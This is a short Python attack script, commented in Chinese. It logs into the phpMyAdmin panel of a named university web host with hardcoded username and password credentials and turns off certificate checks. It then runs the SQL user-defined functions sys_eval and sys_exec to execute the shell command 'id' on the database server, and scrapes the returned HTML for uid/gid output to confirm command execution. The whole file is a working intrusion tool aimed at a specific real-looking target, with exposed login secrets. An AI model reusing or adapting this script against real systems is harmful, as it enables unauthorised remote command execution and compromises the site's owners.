#!/usr/bin/env python3
import requests
import re
import html
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 测试sys_eval获取输出
print("\n[*] 测试sys_eval执行id命令...")
sql = "SELECT sys_eval('id');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

# 保存完整响应
with open("/tmp/id_output.html", "w", encoding="utf-8", errors="ignore") as f:
    f.write(resp.text)

# 详细解析
content = resp.text
print(f"[*] 响应长度: {len(content)}")

# 查找所有表格单元格
tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
print(f"[*] 找到{len(tds)}个TD标签")

for i, td in enumerate(tds[:30]):
    clean = re.sub(r'<[^>]+>', '', td).strip()
    clean = html.unescape(clean)
    if clean and len(clean) > 0:
        print(f"TD[{i}]: {repr(clean[:150])}")
        if "uid=" in clean.lower() or "gid=" in clean.lower() or "root" in clean.lower():
            print(f"[+] 找到命令输出: {clean}")

# 查找所有文本内容
text = re.sub(r'<script[^>]*>.*?</script>', '', content, flags=re.DOTALL)
text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL)
text = re.sub(r'<[^>]+>', ' ', text)
text = html.unescape(text)

# 查找包含uid的行
lines = text.split('\n')
for line in lines:
    if "uid=" in line.lower() or "gid=" in line.lower():
        clean_line = ' '.join(line.split())
        if len(clean_line) > 10:
            print(f"[+] 文本中找到输出: {clean_line[:200]}")

# 尝试查找pre标签
pres = re.findall(r'<pre[^>]*>(.*?)</pre>', content, re.DOTALL)
for i, pre in enumerate(pres):
    clean = re.sub(r'<[^>]+>', '', pre).strip()
    clean = html.unescape(clean)
    if clean and len(clean) > 3:
        print(f"[+] PRE[{i}]: {clean[:200]}")

# 尝试sys_exec
print("\n[*] 测试sys_exec执行id命令...")
sql = "SELECT sys_exec('id');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

content = resp.text
tds = re.findall(r'<td[^>]*>(.*?)</td>', content, re.DOTALL)
for i, td in enumerate(tds[:20]):
    clean = re.sub(r'<[^>]+>', '', td).strip()
    clean = html.unescape(clean)
    if clean and len(clean) > 0:
        if clean.isdigit() or "0" in clean or "1" in clean:
            print(f"[*] sys_exec返回码: {clean}")
